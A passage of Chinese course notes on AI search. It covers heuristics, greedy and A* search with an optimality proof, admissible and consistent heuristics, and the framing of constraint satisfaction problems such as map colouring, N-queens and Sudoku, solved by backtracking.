的</strong>。</li><li>优点很好，但缺点也很严重——<strong>一般情况下开销极大，因为遍历了一个正权下的所有状态结点</strong>（可以通过 goal 的信息进行优化，后面介绍，就是 <strong>informed search</strong>）；</li></ul></li></ul></li></ul><h2 id="1-4-Informed-Search"><a href="#1-4-Informed-Search" class="headerlink" title="1.4 Informed Search"></a>1.4 Informed Search</h2><blockquote><p>搜索问题的定义是相同的，只不过 informed search（有提示搜索）的 <strong>expanding strategy</strong> 会考虑到距离 goal 的远近程度（在 uninformed search 的基础上进行改进）而已。</p><p>所以下面仅比较不同的 expanding strategy。</p></blockquote><h3 id="1-4-1-Search-Heuristics"><a href="#1-4-1-Search-Heuristics" class="headerlink" title="1.4.1 Search Heuristics"></a>1.4.1 Search Heuristics</h3><blockquote><p>启发式搜索，<strong>即启发函数</strong>，是后面 informed search 算法的基础。</p></blockquote><ul><li><p>The definition for a heuristic</p><ul><li><p>A function that estimates <strong>how close a state is to a goal</strong>.</p></li><li><p>Designed for a particular search problem （<strong>因为距离判断因问题而异</strong>）；</p><blockquote><p>可以是 Manhattan distance，Euclidean distance……（for pathing）</p></blockquote></li></ul></li><li><p>Examples</p><ul><li>The pac-man game（去往特定的有食物的地点）：“距离”（heuristic function）可以是与终点的欧式距离、曼哈顿距离（因为上下左右移动）；</li><li>The pancake problem（完成从上到下饼依此增大的排列）：heuristics function 可以是<strong>位置正确的煎饼个数</strong>、<strong>位置不正确的最大煎饼编号（因为和汉诺塔类似，势必要先把最大煎饼先挪到底层）</strong>；</li></ul><blockquote><p>具体选择哪种 heuristic function，<strong>可以举几种固定情况（例如画一部分状态图），看谁的 heuristic function 的值在接近 goal 时表现更好</strong>。</p></blockquote></li></ul><h3 id="1-4-2-Expanding-Strategy-Greedy-Search（贪婪法）"><a href="#1-4-2-Expanding-Strategy-Greedy-Search（贪婪法）" class="headerlink" title="1.4.2 Expanding Strategy: Greedy Search（贪婪法）"></a>1.4.2 Expanding Strategy: <strong>Greedy Search（贪婪法）</strong></h3><ul><li>思路：选择 fringe 中 heuristic function 最接近 goal 的结点进行 expand；</li><li>优点：在某些情况下搜索非常迅速，并且开销很小；</li><li>缺陷：局部最优解不一定是全局最优解，即贪婪法不一定是正确的（<strong>算法不一定是 optimal 的</strong>），最坏情况是 <strong>badly-guided DFS</strong>，尤其是当 heuristics function 没选好的时候；</li></ul><h3 id="1-4-3-Expanding-Strategy-A-Search（A-搜索）"><a href="#1-4-3-Expanding-Strategy-A-Search（A-搜索）" class="headerlink" title="1.4.3 Expanding Strategy: A* Search（A* 搜索）"></a>1.4.3 Expanding Strategy: <strong>A* Search（A* 搜索）</strong></h3><blockquote><p>理解 A star Search 前，先以龟兔赛跑的寓言故事（fable）作比：<strong>Uniform Cost Search (uninformed)</strong> 就像 tortoise，虽然缓慢，但会搜索到同一权重下的所有状态情况，如果有的话确保一定找到最优解；<strong>Greedy Search</strong> 就像 hare，非常迅速，但容易走错方向，找不到最优解。</p><p><strong>所以 A star search 相当于是坐在乌龟上的兔子，既结合了 Uniform Cost Search 的稳妥，又具有 Greedy Search 部分的借助 heuristic function 迅速搜索的特点</strong>。现在看看是如何实现的：</p></blockquote><p>以一个例子来阐释：</p><p><img src="imgs/AStar.png" height="275"></p><p>对于这个正权有向图而言，Uniform Cost Search 的 expanding strategy 是按照<strong>当前步的累计 cost（理解为“深度”）<code>g(n)</code> 来评定的</strong>，而 Greedy Search 的 heuristic function 是按照<strong>距离 goal 的加权路径距离和 <code>h(n)</code> 来评定的</strong>。将 <strong>这两个标准相加得到 A* 的评价标准 <code>f(n)</code></strong>，这样既考虑到了下一步的 cost，又考虑到了距离终点的相对位置，达到了一个较好的效果。</p><blockquote><p>因为如果仅仅是 Uniform cost search，则要搜索 6 个结点才能找到 optimal solution；仅用 Greedy Search 只能找到非 optimal 的解；而用 A-star search 只需搜索 4 个结点就找到了 optimal solution.</p><p>有同学可能会问，为什么上面图中 <code>e</code> 结点的 h = 1 而不是 2？因为这和 heuristic function 的取法有关系。这里可能不是到达终点的路径长度和，而是直线距离。</p><p>思考：为什么只能在结点出队的时候才能检查它是不是 goal 然后再结束？进队的时候不行吗？</p><p>答案：不行。进队的时候，没法保证该结点一定比 fringe 内其他所有结点都要优；</p></blockquote><ul><li><p><strong>A* 算法不一定是 optimal 的</strong>，因为可以举出反例：</p><p><img src="imgs/AStar_counterExample.png" height="200px"></p><p>上面的反例可以看出，<strong>如果 heuristic function 函数没有选好，选的过于 pessimistic，那么很有可能会误导 agent，导致正确的 optimal solution 迟迟无法出队</strong>，这就是 A* 不一定 optimal 的原因——<strong>heuristic function 选取失误</strong>。</p></li><li><p>为了减少以上情况的出现，即优化这个算法，我们引入 <strong>Admissibility</strong> 来评价一个 heuristic function：</p><ul><li><p>如果 heuristic function 在<strong>任意</strong>结点的值 $h(n)$ 小于等于实际到 optimal solution 的加权路径长度 $h^<em>(n)$（<strong>我们在不知道结果前时无法得知，但它数学上客观存在</strong>），那么称为 <strong>optimistic heuristic function</strong>，这样的 A\</em> Search 会得到 optimal solution；</p><blockquote><p>即 optimistic (admissible) heuristic function 的定义为：</p><script type="math/tex; mode=display">\forall\space node\space n,\space 0\le h(n)\le h^*(n)\Longrightarrow h(n)\space is\space admissible</script></blockquote></li><li><p>如果 heuristic function 在某一结点的值大于实际到 optimal solution 的加权路径长度，则称为 <strong>pessimistic heuristic function</strong>，这样的 A* Search 很可能无法得到 optimal solution；</p></li></ul><p><strong>重要的是，虽然我们不知道 $h^*(n)$，但这已经足以我们判断一些情况下使用 A* Search 能否得到 optimal solution了</strong>：</p><p>例如在 pac-man game 的例子中，如果取到 goal 的 Manhattan distance 为 heuristic function，那么<strong>它一定是 optimistic 的，所以用 A* Search 一定能得到正确的 optimal solution</strong>（因为 Manhattan distance 考虑没有墙的情况下的距离，一定是乐观的）；</p><p>再例如在 pancake problem 的例子中，如果取 <strong>错位的薄饼的最大编号</strong> 为 heuristic function，那么 <strong>它也一定是 optimistic 的</strong>（因为你至少还要移动编号个数的薄饼次数才能达到 goal）；</p><p><strong>所以到目前为止，选取 heuristic function 的标准一个是举例子看看在某些结点上，$h(n)$ 是否接近 $g(n)$；另一个就是看看能否判断出 optimistic (admissible)，如果能，则能证明 A* Search 算法的 optimality，那么一定比 Uniform Cost Search 要好</strong>。</p></li></ul><h3 id="1-4-4-拓展：A-Search-的-optimality-证明"><a href="#1-4-4-拓展：A-Search-的-optimality-证明" class="headerlink" title="1.4.4 拓展：A* Search 的 optimality 证明"></a>1.4.4 拓展：A* Search 的 optimality 证明</h3><blockquote><p><strong>为啥取了 admissible 的 heuristic function，A* Search 就一定是 optimal 的？</strong></p></blockquote><p><strong>定义命题：</strong></p><script type="math/tex; mode=display">P:\quad h(n)\space is\space admissible\Longrightarrow A^*\space Search\space is\space optimal</script><p>下面证明命题 $P$：</p><ol><li><p>假设 A* Search tree 如下图所示，具有一个 optimal solution A 和 suboptimal solution B，由于二者的任意性，所以只要能证明 A 能在 B 之前出队并 expand，则就能证明 $P$；</p></li><li><p>再假设 B 在 fringe 中的情况（即 B 在搜索队列中），否则 $P$ 直接成立；</p></li><li><p>再假设 A 或 A 的祖先结点一定在 fringe 中，否则<strong>A 及其祖先节点一定都已经 expand 完毕了（因为 A，至少 A 的祖先节点，是 $f(n)$ 值小于 B 的 “候选结点”）</strong>，这个时候 $P$ 也直接成立；所以记在 fringe 中的 A 或其祖先结点为 n，如下图所示；</p></li><li><p>则可以证明 $f(n)\le f(A)$：由 $f(n)$ 的定义可知，$f(n)=g(n)+h(n)$，再由 admissibility 的定义可知，</p><script type="math/tex; mode=display">h(n)\space is\space admissible\Longrightarrow h(n)\le h^*(n)\Longrightarrow g(n)+h(n)\le g(n)+h^*(n)</script><p><strong>即 $f(n)\le g(A)$</strong>；再根据 heuristic function 的定义，$h(A)=0$，所以 $g(A)=f(A)$，进而得出 $f(n)\le f(A)$；</p></li><li><p>能够证明 $f(A)\lt f(B)$：由 suboptimal solution 的定义，$g(A)\lt g(B)$，由于 $h(A)=h(B)=0$，所以 $f(A)\lt f(B)$；</p></li><li><p>由第 4 条和第 5 条，能够证明 n 必然在 B 之前 expand，即 $f(n)\lt f(B)$（因为 $f(n)\le f(A)\lt f(B)$）；</p></li><li><p><strong>由于祖先结点 n 的任意性，所以 A 或 A 的祖先结点一定都在 B 之前 expand</strong>，所以 任意的 optimal solution A 一定在 suboptimal solution B 之前 expand，因此 A* Search 的 solution 必然是 optimal solution，$P$ 成立，原命题得证。</p></li></ol><p><img src="imgs/AStar_optimality_proof.png" height="200px"></p><blockquote><p>Q：为什么第 5 条 $f(A)\lt f(B)$ 不就能说明 A 在 B 前 expand 了吗？</p><p>A：其实不然，我们在第 5 条的时候还缺少一个条件——我们当时还不能证明 A 结点一定在 fringe 当中。我们只知道 A 的祖先结点在 fringe 当中。</p></blockquote><h3 id="1-4-5-How-to-Create-Admissible-Heuristic-Functions"><a href="#1-4-5-How-to-Create-Admissible-Heuristic-Functions" class="headerlink" title="1.4.5 How to Create Admissible Heuristic Functions ?"></a>1.4.5 How to Create Admissible Heuristic Functions ?</h3><ul><li><p>example: 8 puzzle（8 格华容道）</p><p><img src="imgs/8puzzles.png" height="275px"></p><ul><li>取法 1：状态结点 n 中，错位的数字数目定为 heuristic function $h(n)$，此时易得 $h(n)$ 是 admissible 的；</li><li><strong>结论 1</strong>：<strong>将原问题转化为 relaxed-problem heuristic 来讨论</strong>，例如在 8-puzzle 里面，如果能够直接把数字拆下来，直接安装到正确位置，那么这个问题就变简单了，action 数目一定变少了，而这个新问题就叫做 <strong>relaxed-problem</strong>；显然有：<strong>新问题的总步数（cost）小于原问题的 optimal solution 的步数（cost）</strong>；</li><li>取法 2：状态结点 n 中，所有数字距离正确位置的 Manhattan distance 的总和定为 $h(n)$，这个做法就是上述结论的应用。这种取法对应的 relaxed-problem 是 <strong>忽略数字方块之间的格挡限制</strong>，可以证明这种取法的 $h(n)$ 不仅是 admissible 的，而且<strong>比取法 1 更接近真实 optimal solution 的 cost</strong>；</li></ul></li><li><p><strong>总而言之，Heuristic function 的选取就在 <u>node expansion 的空间消耗</u> 和  $h(n)$ <u>计算的时间消耗</u> 之间抉择、权衡</strong>。但一般无论哪个方向，都<strong>必须要是 admissible 的（因为如果不是的话，就不能保证 A* Search 的 optimality，那还不如用 Greedy search）</strong>。</p><ul><li>要么 $h(n)$ 选取一些 admissible 且方便计算的函数，但平均需要更多的 node expansion 才能找到 optimal solution；</li><li>要么 $h(n)$ 选取一些 admissible 且更接近真实 optimal solution cost 的函数，但一般平均需要花费更长时间才能计算出 $h(n)$ 在某一结点的值；</li></ul></li><li><p><strong>结论 2</strong>：两个 admissible heuristic function 的最大值函数一定是更接近于真实 optimal solution cost 的 admissible heuristic function；如下图：</p><p><img src="imgs/h_semilattice.png" height="300px"></p><blockquote><p>注：如果 $\forall n,\space h(n)=0$，则 A* search 退化为 Uniform Cost Search（相当于提供 goal 的信息被 “磨平了”，各结点处都一样了）</p></blockquote></li></ul><h3 id="1-4-6-From-Tree-Search-to-Graph-Search"><a href="#1-4-6-From-Tree-Search-to-Graph-Search" class="headerlink" title="1.4.6 From Tree Search to Graph Search"></a>1.4.6 From Tree Search to Graph Search</h3><p>前面说的算法，从 uninformed search (DFS、BFS、Uniform Cost Search) 到 informed search (Greedy Search、A* Search)，都借助了 <strong>Tree Search</strong> 的思想，没有标注 visited 结点，导致大量重复冗余的 node expansion（同一状态结点入队多次）。</p><p>我们借鉴图算法的思想，只需要在前面 Tree Search 算法中 <strong>expansion strategy 前</strong> 加入 visited 判断，即可变成 Graph Search。具体实现方法可以借助 <strong>closed set</strong>（闭集，就是集合结构的数学名称）（别用列表，因为<strong>线性表查找元素是否存在的时间复杂度远大于集合结构</strong>）</p><p>易得，<strong>Tree Search 算法和同等的 Graph Search 算法的 complete 性质相同</strong>。因为它们理论上都能遍历完有限结点。</p><p>但！<strong>转换为 Graph Search 后，却不一定有同等的 optimality</strong>。因为在某些情况下，如果某些 admissible heuristic function 选的不好，很有可能导致 visited 会放弃掉 optimal solution，例如下面这种情况：</p><p><img src="imgs/AStarGraph_counterExample.png" height="270px"></p><p><strong>这是因为 heuristic function 选取的不一致性（inconsistency）导致的</strong>，通常是因为<strong>两个结点之间的 $h(n)$ 值之差大于它们间的 cost</strong>，导致其中一个结点<strong>需要第二次进队才有可能找到 optimal solution</strong>。这里结点 A 和 C 之间就存在这个问题，$h(A)-h(C)=3\gt cost(A,C)=1$，所以当 C 结点在 A* Tree Search 第二次进队时，才算 optimal solution。如果贸然转换为 Graph Search，就会丢失这个 optimal solution。</p><p>所以，考虑对于一个 admissible heuristic function，如果每两个结点之间的 $h(n)$ 值之差必然小于等于它们之间的 cost，<strong>所以称这个 admissible heuristic 为 consistent 的</strong>。</p><p>只有 heuristic function 是 consistent 的，<strong>越靠 fringe 后面弹出的 node，其 $f(n)$ 越大，越不可能是 optimal solution</strong>，否则不能满足这个特性。</p><p><img src="imgs/consistency_of_heuristics.png" height="275px"></p><ul><li>性质 1： <strong>Consistency 蕴含（implies）Admissibility</strong>（一个 consistent heuristic function 一定是 admissible heuristic function）；</li><li>性质 2：只有选取了 Consistent heuristic function，A* Graph Search 才能保证 optimality，但 A* Tree Search 只需要 Admissible heuristic function 就能保证 optimality；</li></ul><p>因此，<strong>如果选取的 heuristic 具备 consistency</strong>，那么将之前的所有 Tree Search 算法加上 visited 判断变成 Graph Search 算法，均不改变其 completion 和 optimality，并且可以减少 node expansion 的数目，实现算法的优化。</p><p><strong>值得庆幸的是，大部分自然得到的 admissible heuristic functions 都是 consistent 的，尤其是由 relaxed problems 取得的</strong>。所以大可以认为，用 relaxed problems 方法取得的 heuristic functions 都具有 consistency，而无需证明。</p><p>上面的 “一致性” 比较抽象，有位知乎网友 <code>@Hepta</code> 解释的好，截下来给大家参考：</p><p><img src="imgs/zhihu_explain.png" height="400px"></p><p>这可以认为，这个 heuristic function 取得确实是 admissible（每个结点的 $h(n)$ 总趋势都是越接近 goal 就越接近0，并且是<strong>乐观估计</strong>的），但是每个路线上的 “乐观估计程度不相同”，如果存在一种情况：<strong>一个实际更长（cost 更大）的路径比一个实际更短（cost 更小）路径的 $h(n)$ 更乐观——即虽然它们各自都正确反映了 goal 远近的性质（admissible），但相对远近反映不一致（inconsistent），这就是 heuristic function 的不一致性</strong>。</p><p>这种不一致就会影响搜索，导致<strong>suboptimal solution 的路径比 optimal solution 的路径更快到达 solution <u>附近停下来</u></strong>（但总体受到 admissible 的限制，suboptimal solution 不会先进队的），所以这个时候如果附近的结点又恰好唯一，并且还有 visited 不允许重复进队，那么 optimal solution 的路径就会被 suboptimal solution 的路径截断，造成错误地丢失正确最优解。</p><p>所以上面说 “relaxed problems 得到的 admissible heuristic function 都有 consistency” 是符合一般规律的，故意设计的 heuristic function 可能不满足 consistency、满足 admissible，但它一般不能从 relaxed problems 得出。</p><h3 id="1-4-7-补充：Dijkstra-Algorithm-amp-A-Algorithm"><a href="#1-4-7-补充：Dijkstra-Algorithm-amp-A-Algorithm" class="headerlink" title="1.4.7 补充：Dijkstra Algorithm &amp; A* Algorithm"></a>1.4.7 补充：<code>Dijkstra</code> Algorithm &amp; A* Algorithm</h3><p>其实细心的同学已经发现，<code>Dijkstra</code> 算法不就是 A* 算法的特殊情况嘛！当我们仅仅以当前步累计的 cost（去掉距离 goal 的 cost）作为 heuristic function 时，A* 算法就退化为了 <code>Dijkstra</code> 算法。</p><p>它们都只能解决非负边权值图的最短路径问题。</p><h2 id="1-5-Summary"><a href="#1-5-Summary" class="headerlink" title="1.5 Summary"></a>1.5 Summary</h2><p>本章讲述了 <strong>搜索问题</strong> 的基本定义和算法。我们可以总结出：</p><ul><li><p>搜索问题的使用场景：用于一类很特定的问题，它们满足搜索问题的模板。例如地图导航的最短路搜索、没有敌人并且是去往特定位置的 pac-man 游戏；</p></li><li><p>搜索问题中 Agent 的性质：<strong>Planning Agent</strong>，即先根据算法计算，得出一系列动作序列之后再行动，<strong>更关注 master-mind，即固定的动作序列解法来得到最优解</strong>；</p></li><li><p>搜索问题的前提假设：单个 Agent（<strong>没有其他 agent 做出不确定 (uncertain) 或者对抗性 (adversarial) 的 actions 对当前 agent 造成影响</strong>）、可决定的 Actions、完全可观测的 States、离散的 State space；</p></li><li><p>搜索问题的目标</p><ul><li><p><strong>获取路径</strong>：此时 Agent 的性质是 <strong>Planning Agent</strong>，即先根据算法计算，得出一系列动作序列之后再行动，<strong>更关注 master-mind，即固定的动作序列解法（即路径）来得到最优解</strong>；</p><blockquote><p>本章讲述的几乎所有内容都是关于这个方面的；</p></blockquote></li><li><p><strong>获得结果</strong>：此时动作序列并不重要，只关心这个动作序列能否达到 goal；通常这种目标下不会考虑 costs；</p></li></ul></li></ul><p>所以搜索问题的假设很多，在这个问题基础上，我们添加了一些信息，例如路径是否等权？权重大小多少？是否可以用 goal 信息来 inform 搜索的方法？</p><p>对应的算法常见的有：Tree Search 的 DFS、BFS、UCS（都是 uninformed）和 Greedy Search、A Star Search；进一步进行改进还有对应的 Graph Search。</p><p>以后几章，我们将一点点解除这些前提假设的限制，让问题发生变化，并探讨新问题的算法。</p><h1 id="Chapter-2-Constraint-Satisfaction-Problems-CSPs"><a href="#Chapter-2-Constraint-Satisfaction-Problems-CSPs" class="headerlink" title="Chapter 2. Constraint Satisfaction Problems (CSPs)"></a>Chapter 2. Constraint Satisfaction Problems (CSPs)</h1><h2 id="2-1-The-Introduction-to-CSP"><a href="#2-1-The-Introduction-to-CSP" class="headerlink" title="2.1 The Introduction to CSP"></a>2.1 The Introduction to CSP</h2><p>正如上一章总结所说，CSP 只是一种特殊的 “获取结果” 的 Search Problem，它对问题作了如下假设：</p><ul><li>状态空间是个<strong>黑盒</strong>，可以是任何数据结构，无法直接访问状态空间的信息；</li><li>目标测试也可以是任何形式的函数，也是黑盒，只能调用（即从结果上看是否达到目标）；</li><li>后继函数仍然是黑盒，你只能通过调用来取得可能的后继状态；</li></ul><p>因此我们可以问题抽象为新的数学表示：</p><ul><li>CSP 就是 Search Problem 的一个特殊子集，目标本质是找到 goal；</li><li>所有的<strong>状态</strong>可以被定义为一组变量：$X_i$，其值在定义域 $D$ 中变化（<strong>有的时候 $D$ 取决于 $i$</strong>）；</li><li><strong>后继函数</strong>的运作方法类似为这些状态变量赋值；</li><li><strong>目标测试</strong>就是一组<strong>限制条件（Constraints）</strong>，指明了最终的 goal，即可接受的<strong>状态序列（由可接受的一组 $X_i$ 的值组成）</strong>，这也是为什么这个问题被称为 “Constraint Satisfaction Problems”；</li></ul><p>它的应用相当广泛，生活中几乎都能见到。</p><h3 id="2-1-1-Example-1-地图上色"><a href="#2-1-1-Example-1-地图上色" class="headerlink" title="2.1.1 Example 1: 地图上色"></a>2.1.1 Example 1: 地图上色</h3><p>举一个例子，计算机证明 <strong>四色定理</strong> 时需要正确地为地图分配颜色。现在我们想要为地图上一片有划分的区域填色，要求<strong>相邻区域颜色不得相同</strong>。具体做法如下：</p><ol><li>首先把问题抽象为 CSP。很显然，问题的<strong>状态可以由一组区域变量表示</strong>，其定义域为各自不同颜色组成的集合，这里假设有 6 个区域，在 $x_1\sim x_6$；</li><li>这里可以把颜色定义域设置为 3 种颜色：<code>D = &#123; red, green, blue &#125;</code>；</li><li>目标测试（限制条件）<ul><li>Implicit（隐含）：adjacent regions must have different colors（体现在代码中就是每两个相邻区域变量不相等）；</li><li>Explicit（明确）： $(x_i,x_j)\in\{(red,green),(red,blue),\cdots\}$；</li></ul></li><li>解决方案（solution）：就是一组或多组符合限制条件的 $x_i$ 的赋值（assignments），<strong>CSP 问题的解只需要找到一个解即可</strong>；</li></ol><hr><p>除了使用变量 + 限制条件的方法，还有一种方法可以描述 CSP 问题：<strong>Constraint Graphs</strong>：</p><ul><li><p>每个变量由图中的一个结点代替；</p></li><li><p><strong>如果限制条件是 二元 的</strong>（是/否、有/无、等于/不等于，等等），那么可以用结点之间是否连接边来表示；</p><blockquote><p>注意：<strong>限制图的边只是表示哪里有限制，没有说明限制是什么</strong>，所以应该是二元的限制条件；</p></blockquote></li></ul><p>这种<strong>最多每两个变量之间</strong>具有<strong>二元限制条件</strong>的 CSP  问题被称为 Binary CSP，对应的限制图被称为 Binary Constraint Graph；</p><p>相对应的还有<strong>一元限制条件（Unary Constraint）</strong>，即指定变量必须为某特定值；后面会具体说。</p><h3 id="2-1-2-Example-2-N-Queens-问题"><a href="#2-1-2-Example-2-N-Queens-问题" class="headerlink" title="2.1.2 Example 2: N-Queens 问题"></a>2.1.2 Example 2: N-Queens 问题</h3><p>我们听过 “八皇后问题”，那么对于 N-皇后问题，除了使用递归+回溯的经典解法，还可以将其转化为 CSP 求解：</p><ul><li><p>表示方法 1：逐格表示</p><ul><li><p>状态：就是 N × N 的数组，用于保存其上是否存在 “皇后” 棋，定义域为 <code>&#123;0, 1&#125;</code>；</p></li><li><p>目标测试（限制条件）：</p><ol><li>$\forall i,j,k\space(X_{ij},X_{ik})\in\{(0,0),(0,1),(1,0)\}$（不能在同一行）</li><li>$\forall i,j,k\space(X_{ij},X_{kj})\in\{(0,0),(0,1),(1,0)\}$（不能在同一列）</li><li>$\forall i,j,k\space(X_{ij},X_{i+k,\space j+k})\in\{(0,0),(0,1),(1,0)\}$（不能在对角线下半部分）</li><li>$\forall i,j,k\space(X_{ij},X_{i+k,\space j-k})\in\{(0,0),(0,1),(1,0)\}$（不能在对角线上半部分）</li><li>$\sum_{i,j}X_{ij}=N$；</li></ol></li></ul></li><li><p>表示方法 2：列表示</p><ul><li>状态：第 $k$ 行的 queen 位于的列数 $Q_k$，定义域为 <code>&#123;1, 2, ..., N&#125;</code>；</li><li>限制条件：$(Q_1,Q_2)\in\{(1,3),\space(1,4),\cdots\}$ ……;</li></ul></li></ul><h3 id="2-1-3-Example-3-Cryptarithmetic-加密运算"><a href="#2-1-3-Example-3-Cryptarithmetic-加密运算" class="headerlink" title="2.1.3 Example 3: Cryptarithmetic 加密运算"></a>2.1.3 Example 3: Cryptarithmetic 加密运算</h3><p>例如对加法式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    T W O</span><br><span class="line">  + T W O</span><br><span class="line">-----------</span><br><span class="line">  F O U R</span><br></pre></td></tr></table></figure><p>解出每个字母所代表的数字（0 ~ 9）；可以抽象出如下 CSP 问题：</p><ul><li>变量 F、T、U、W、R、O、C1（第一位进位）、C2、C3；定义域 <code>&#123;0,1,...,9&#125;</code>；</li><li>限制条件<ul><li>alldiff(F, T, U, W, R, O)，字母各不相同；</li><li>O + O = R + 10 * C1, ……;</li></ul></li></ul><h3 id="2-1-4-Example-4-Sudoku"><a href="#2-1-4-Example-4-Sudoku" class="headerlink" title="2.1.4 Example 4: Sudoku"></a>2.1.4 Example 4: Sudoku</h3><p>对于数独而言，转化为 CSP 可以是：</p><ul><li>变量即每一个没有填数的方块，定义域 0 ~ 9 的整数；</li><li>限制条件<ul><li>每一行所有元素不得相同；</li><li>每一列所有元素不得相同；</li><li>每一小正方形区域所有元素不得相同；</li><li>本身填有数的方块为 Unary Constraint，要求必须为某个数字；</li></ul></li></ul><h3 id="2-1-5-Example-5-The-Waltz-Algorithm-Deprecated"><a href="#2-1-5-Example-5-The-Waltz-Algorithm-Deprecated" class="headerlink" title="2.1.5 Example 5: The Waltz Algorithm (Deprecated)"></a>2.1.5 Example 5: The Waltz Algorithm (Deprecated)</h3><p>早期计算机视觉使用这个算法来识别 3D 图形的顶点是向外凸，还是向内凹。基本原理是：将立体中的所有顶点作为一个变量，限制条件就是<strong>相邻两个点不能一个是凸顶点，一个是凹顶点</strong>；</p><h2 id="2-2-Varieties-of-CSPs"><a href="#2-2-Varieties-of-CSPs" class="headerlink" title="2.2 Varieties of CSPs"></a>2.2 Varieties of CSPs</h2><h3 id="2-2-1-Varieties-of-Variables"><a href="#2-2-1-Varieties-of-Variables" class="headerlink" title="2.2.1 Varieties of Variables"></a>2.2.1 Varieties of Variables</h3><p>研究 CSPs 算法前，先弄清楚 CSPs 的详细信息。首先 CSP 总的来说有两种变量类型：</p><ul><li>离散型变量（Discrete Variables）<ul><li>有穷定义域（$card(D)=d$）：存在 $O(d^n)$ 种完全指配；例如 二元 CSP，有些是 NP-完全 问题；</li><li>无穷定义域（整型、字符串等）：更加困难，例如工作安排问题（某些问题必须在另一些问题之前完成）；<strong>仅线性约束可解</strong>。</li></ul></li><li>连续型变量（Continuous Variables）<ul><li>例如与时间变化有关的问题，<strong>线性约束可解，并且是多项式时间内可以利用 LP 方法完成</strong>；</li></ul></li></ul><h3 id="2-2-2-Varieties-of-Constraints"><a href="#2-2-2-Varieties-of-Constraints" class="headerlink" title="2.2.2 Varieties of Constraints"></a>2.2.2 Varieties of Constraints</h3><ul><li><p>Unary Constraint：<strong>与单个变量有关，等价于减小定义域</strong>，例如：$x=1$、$y\ne2$；</p></li><li><p>Binary Constraint：<strong>仅与一对变量有关</strong>，例如：$x=y$、$a\ne b$；</p></li><li><p>Higher-order Constraint: involve 3 or more variables，例如 2.1.3 加密计算；</p></li><li><p>Soft Constraint: Preferences（非强制的倾向），实现方法是<strong>加权，并且转化为限制优化问题</strong>；</p><blockquote><p>本章会忽略这种情况，到 <strong>贝叶斯网络</strong> 再讨论这个问题。</p></blockquote></li></ul><h2 id="2-3-The-formulations-for-Binary-CSPs"><a href="#2-3-The-formulations-for-Binary-CSPs" class="headerlink" title="2.3 The formulations for Binary CSPs"></a>2.3 The formulations for Binary CSPs</h2><blockquote><p>本节仅讨论 <strong>Constraint 至多与 2 个变量有关</strong>的问题。</p></blockquote><h3 id="2-3-1-Standard-Search-Formulation"><a href="#2-3-1-Standard-Search-Formulation" class="headerlink" title="2.3.1 Standard Search Formulation"></a>2.3.1 Standard Search Formulation</h3><p>一种常用解决 CSP 问题的方法被称为 Standard Search Formulation，方法将 CSP 问题看作一种特殊的搜索问题，定义如下：</p><ul><li>状态：defined by the values assigned so far；</li><li>初始状态：空指派；</li><li>后继函数：为一个没有指派的变量从定义域种指派一个值；</li><li>目标测试：当前指配是否为完全指派，并且满足所有约束条件；</li></ul><p>现在讨论这种思路下的算法，从最原始的方法开始来一步步优化。</p><p>现在以上面任一个 Example 为例。</p><h4 id="BFS-遍历"><a href="#BFS-遍历" class="headerlink" title="BFS 遍历"></a>BFS 遍历</h4><p>我们考虑最原始的 BFS 遍历，发现这是最差的算法，没有之一。因为这个问题中，所有的解法都在搜索树的最底层。意味着 BFS 需要遍历几乎所有状态才能找到至少一个解。我们大可以直接放弃这个方法。</p><h4 id="DFS-遍历"><a href="#DFS-遍历" class="headerlink" title="DFS 遍历"></a>DFS 遍历</h4><p>在这个问题中，DFS 方法要比 BFS 好一些，<strong>所以这一节中接下来的优化算法都基于此</strong>。这和上一章解决普通 Search Problem 的思路不一样，那个时候的算法几乎都从 BFS 的思路出发（UCS / A Star）。</p><p>实现思路是先一步步沿搜索树向下指派变量，<strong>全部指派结束后，再检查目标测试</strong>，不满足则从栈中弹出最上面的赋值（最后一个赋值），换一个值，如此递归进行。</p><p>实现思路简单，但是非常繁琐，接下来进行优化。</p><h4 id="Backtracking-Search"><a href="#Backtracking-Search" class="headerlink" title="Backtracking Search"></a>Backtracking Search</h4><p>是一种解决 CSP 的 basic uninformed algorithm，思路如下：</p><ul><li><p>一次仅对一个变量进行操作</p><ul><li><strong>变量指派是可交换顺序的，所以首先定下顺序</strong>（例如先赋值 $x=1$，再赋值 $y=2$ 和 先赋值 $y=2$，再赋值 $x=1$ 是等价的），只要将定义域排序，并且按序指派就能实现；</li><li><strong>每一步只需要考虑一个单独变量的指派</strong>；</li></ul></li><li><p><strong>每一步都检查限制条件</strong>：一旦违反条件，立即更换当前最近一次的指派。</p><blockquote><p><strong>这主要因为 CSP 问题在前一步违反条件后，后面指派就没有机会弥补，或者说使状态重新符合条件</strong>。类似一种剪枝。</p></blockquote></li></ul><p>使用以上两个思路优化的 DFS 被称为 Backtracking Search（回溯搜索）；</p><p>这种算法在解决 Example 2 的 N-queens 时，能够解出在 N ≤ 25 范围的问题。</p><p><img src="imgs/backtracking_search_pseudo_code.png" height="300px"></p><p>现在考虑 backtracking 能否继续优化？从以下方面考虑：</p><ul><li>指派定义域排序：<strong>下一个先指派定义域中的谁？按什么顺序？</strong></li><li>中途过滤：<strong>能否在违反限制之前就检测到可能的风险，并且尽早规避？</strong>（使得递归深度减小）</li><li>数据结构：能否进一步改进问题的数据结构，使其更高效？</li></ul><p>先从方便下手的部分开始：中途过滤。</p><p><strong>优化方案 1: Forward Checking</strong></p><p>思路之一是 <strong>Forward Checking</strong>，在为一个变量指派时，同时根据限制<strong>缩小其他变量（必须仅仅是有限制联系的，no further）的定义域</strong>（排除不符合限制的取值）。一旦发现有变量的定义域为空，则提前检测到了违反限制的情况，所以提前排除这种指派，重新为当前变量指派。</p><blockquote><p>In general, forward checking is going to propagate information from assigned values to unassigned values, but <strong>doesn’t provide early detection for all failures</strong> (looming conflicts between unassigned and other unassigned variables).</p></blockquote><p><strong>优化方案 2: Rich Filtering Algorithm - Graph Arc Consistency Checking</strong></p><p>这种方法还可以继续向前预测，因为在地图上色例子中，当地图两个相邻区域定义域只有相同颜色时，也希望被提前检测到。这就需要 <strong>reason from constraint to constraint</strong>（从一个限制条件推广传递至另一个），用到的技术是 <strong>arc consistency</strong>（限制图有向边一致性，<strong>arc 和 edge 都可以指图的边</strong>）。</p><p>在 Forward Checking 中，我们让每一步都按照<strong>给定的限制条件检查并更新定义域</strong>，但是某些限制条件之间可以推出另外的限制条件，让违反限制的情况更早地被检查到。我们可以通过 